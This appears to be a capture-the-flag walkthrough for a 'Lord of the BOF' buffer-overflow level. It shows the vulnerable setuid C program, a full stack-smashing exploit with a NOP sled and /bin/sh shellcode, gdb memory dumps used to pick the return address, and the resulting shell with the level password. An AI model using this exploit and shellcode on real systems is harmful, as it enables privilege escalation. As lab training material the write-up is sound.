# Level9

## This level's goal
- LEVEL9 (troll -> vampire) : check 0xbfff

***

```
[troll@localhost troll]$ bash2

[troll@localhost troll]$ ls -l
total 16
-rwsr-sr-x    1 vampire  vampire     12103 Mar  2  2010 vampire
-rw-r--r--    1 root     root          550 Mar 29  2010 vampire.c

[troll@localhost troll]$ cat vampire.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

In the code, there are some changed codes that the first byte of return address should be "0xbf" and the second byte should not be "0xff".

But the stack can be changed, so the stack will be streched when you input the large of values.

```
[troll@localhost troll]$ gcc vampire.c -o vampire2
[troll@localhost troll]$ ./vampire2 `python -c 'print "A"*44+"\xff\xff\xbf\xbf"+" "+"\x90"*100000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDÿÿ¿¿
Segmentation fault (core dumped)
[troll@localhost troll]$ gdb -c core -q
Core was generated by `./vampire2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`wþ¿ '.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfffff in ?? ()
(gdb) x/200x $esp
0xbffe7450:     0x00000000      0xbffe7494      0xbffe74a4      0x40013868
0xbffe7460:     0x00000003      0x08048380      0x00000000      0x080483a1
0xbffe7470:     0x08048430      0x00000003      0xbffe7494      0x080482e0
0xbffe7480:     0x080484fc      0x4000ae60      0xbffe748c      0x40013e90
0xbffe7490:     0x00000003      0xbffe7586      0xbffe7591      0xbffe75c2
0xbffe74a0:     0x00000000      0xbffffc7c      0xbffffc8c      0xbffffca4
0xbffe74b0:     0xbffffcc3      0xbffffce5      0xbffffcf0      0xbffffeb3
0xbffe74c0:     0xbffffed2      0xbffffeed      0xbfffff02      0xbfffff1f
0xbffe74d0:     0xbfffff2a      0xbfffff38      0xbfffff40      0xbfffff4a
0xbffe74e0:     0xbfffff5a      0xbfffff68      0xbfffff76      0xbfffff87
0xbffe74f0:     0xbfffff92      0xbfffffa3      0xbfffffe4      0x00000000
0xbffe7500:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffe7510:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffe7520:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffe7530:     0x00000009      0x08048380      0x0000000b      0x000001fc
0xbffe7540:     0x0000000c      0x000001fc      0x0000000d      0x000001fc
0xbffe7550:     0x0000000e      0x000001fc      0x00000010      0x2bd3fbff
0xbffe7560:     0x0000000f      0xbffe7585      0x00000000      0x00000000
0xbffe7570:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffe7580:     0x00000000      0x2f2e0000      0x706d6176      0x32657269
0xbffe7590:     0x44444400      0x44444444      0x44444444      0x44444444
0xbffe75a0:     0x44444444      0x44444444      0x44444444      0x44444444
0xbffe75b0:     0x44444444      0x44444444      0x44444444      0xbfffff44
0xbffe75c0:     0x909000bf      0x90909090      0x90909090      0x90909090
0xbffe75d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe75e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe75f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7600:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7610:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7620:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7630:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7640:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7650:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7660:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7670:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7680:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7690:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe76a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe76b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe76c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe76d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe76e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe76f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7700:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7710:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7720:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7730:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7740:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7750:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7760:     0x90909090      0x90909090      0x90909090      0x90909090

[troll@localhost troll]$ ./vampire `python -c 'print "A"*44+"\x60\x77\xfe\xbf"+" "+"\x90"*100000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`wþ¿
bash$ my-pass
euid = 509
music world
```
